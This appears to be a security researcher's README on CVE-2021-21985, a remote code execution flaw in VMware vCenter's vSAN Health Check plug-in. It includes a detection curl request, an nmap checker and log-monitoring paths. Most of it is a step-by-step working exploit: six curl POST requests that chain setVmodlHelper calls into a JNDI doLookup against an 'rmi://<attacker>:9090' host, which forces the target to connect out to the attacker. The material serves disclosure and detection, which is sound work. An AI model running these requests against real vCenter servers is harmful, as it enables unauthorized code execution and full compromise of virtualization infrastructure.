
# CVE-2021-21985 (Vulnerable Code) 

![06_test_class_method](https://user-images.githubusercontent.com/3140111/120136760-2b152b80-c1d3-11eb-8bb7-392b629358f4.png)

CLASS/METHOD(s) available, a little sample for PoC purposes: com.vmware.vsan.client.services.capability.VsanCapabilityProvider 

```
[../snip]
getClusterCapabilityData
getHostCapabilityData
getHostsCapabilitiyData
getIsDeduplicationSupported
getIsEncryptionSupported
getIsLocalDataProtectionSupportedOnVc
getIsLocalDataProtectionSupportedOnCluster
getIsRemoteDataProtectionSupported
getIsObjectIdentitiesSupportedOnCluster
getIsHistoricalCapacitySupported
getIsPerfVerboseModeSupported
getIsPerfNetworkDiagnosticModeSupported
getIsPerfDiagnosticsFeedbackSupportedOnVc
getIsAdvancedClusterSettingsSupported
getIsRecreateDiskGroupSupported
getIsPurgeInaccessibleVmSwapObjectsSupported
getIsUpdateVumReleaseCatalogOfflineSupported
getIsVitOnlineResizeSupported
getIsImprovedCapacityMonitoringSupportedOnVc
getIsVmLevelCapacityMonitoringSupported
getIsWhatIfCapacitySupported
getIsHostReservedCapacitySupported
getIsUnmountWithMaintenanceModeSupported
getIsEvacuationStatusSupportedOnCluster
...
...
[../snip]
```

# CVE-2021-21985 (PoC)
The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input validation in the Virtual SAN Health Check plug-in which is enabled by default in vCenter Server.

This manual inspec looks the existence of CVE-2021-21985 based on CLASS/METHOD(s) available by default on vCenter e.g. "/ui/h5-vsan/rest/*" sending a POST request and looking in response body (200) JSON data.

Manual inspection: 

```
# curl -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: alex666' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\": null,\"serverGuid\": null}]}\x0d\x0a' $'https://<target>/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData'
```

![03_curl](https://user-images.githubusercontent.com/3140111/120148087-f95a8f80-c1e7-11eb-8977-e21c12477d29.png)

# PoC Exploit Released (1)
Credits: https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/ <br/> 

Steps to reproduce: <br/> 

Start your python server to receive the connection from targeted system (vCenter) e.g <br/> 
```
# python3 -m http.server 9090
```
Step 1: set TargetObject to null <br/> <br/> 
POST /ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetObject HTTP/1.1<br/> 
{“methodInput”:[null]}<br/> 

```
# curl -i -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: alex666' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\xe2\x80\x9cmethodInput\xe2\x80\x9d:[null]}' $'https://<target>/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetObject'
```

Step 2: setStaticMethod to payload <br/> <br/> 
POST /ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setStaticMethod HTTP/1.1 <br/> 
{“methodInput”:[“javax.naming.InitialContext.doLookup”]} <br/> 

```
# curl -i -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: alex666' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\"methodInput\":[\"javax.naming.InitialContext.doLookup\"]}\x0d\x0a' $'https://<target>/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setStaticMethod'
```

Step 3: setTargetMethod to doLookup <br/> <br/> 
POST /ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetMethod HTTP/1.1 <br/> 
{“methodInput”:[“doLookup”]} <br/> 

```
# curl -i -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: alex666' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'\x0d\x0a{\"methodInput\":[\"doLookup\"]}\x0d\x0a' $'https://<target>/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetMethod'
```
Step 4: setArguments with payload args <br/> <br/> 
POST /ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setArguments HTTP/1.1 <br/> 
{“methodInput”:[["rmi://attacker:9090/alex666"]]} <br/> 

```
# curl -i -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: alex666' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\"methodInput\":[[\"rmi://<attacker>:9090/alex666\"]]}' $'https://<target>/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setArguments'
```

Step 5: initial payload class and methods <br/> <br/> 
POST /ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/prepare HTTP/1.1 <br/> 
{“methodInput”:[]} <br/> 

```
# curl -i -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: alex666' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\"methodInput\":[]}' $'https://<target>/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/prepare'
```

Step 6: trigger method invoke, after thiis POST await some seconds and see your pytthon server log <br/> <br/> 
POST /ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/invoke HTTP/1.1 <br/> 
{“methodInput”:[]} <br/> 

```
# curl -i -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: alex666' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\"methodInput\":[]}\x0d\x0a' $'https://<target>/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/invoke'
```

![exploit_01](https://user-images.githubusercontent.com/3140111/120621936-a8a09c00-c45e-11eb-9ff1-b8d7aee6f3fa.png)


# References: 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21985 <br/>
https://www.vmware.com/security/advisories/VMSA-2021-0010.html <br/>
https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985?referrer=home#rapid7-analysis </br>

# CVE-2021-21985 (NSE checker)

This script looks the existence of CVE-2021-21985 based on CLASS/METHOD(s) available by default on vCenter e.g. "/ui/h5-vsan/rest/*" sending a POST request and looking in response body (200) JSON data.

# Usage
```# nmap -p443 --script CVE-2021-21985.nse <target>```

# Output
```
---
-- @usage
-- nmap -p443 --script CVE-2021-21985.nse <target>
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | CVE-2021-21985: 
-- |   VULNERABLE:
-- |   vCenter 6.5-7.0 RCE
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2021-21985
-- |       The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input 
-- |       validation in the Virtual SAN Health Check plug-in which is enabled by default in vCenter Server.
-- |     Disclosure date: 2021-05-28
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21985
```

![CVE-2021-21985](https://user-images.githubusercontent.com/3140111/120142112-01153680-c1de-11eb-87ca-aee4126f5fd8.gif)

# vCenter vSAN Health (console logs) 
PATH logs vCenter

```
# /var/log/vmware/vsan-health/
```
![03_vSAN-health](https://user-images.githubusercontent.com/3140111/120134765-1d5da700-c1cf-11eb-8c17-6df7012cdfb5.png)

# vSphere Client (console logs)
Monitoring the attacks  

```
# tail -f /var/log/vmware/vsphere-ui/logs/vsphere_client_virgo.log
```
![04_monitoring](https://user-images.githubusercontent.com/3140111/120135156-e8058900-c1cf-11eb-8b03-14656b0ee3d5.png)


# Author
Alex Hernandez aka <em><a href="https://twitter.com/_alt3kx_" rel="nofollow">(@\_alt3kx\_)</a></em>
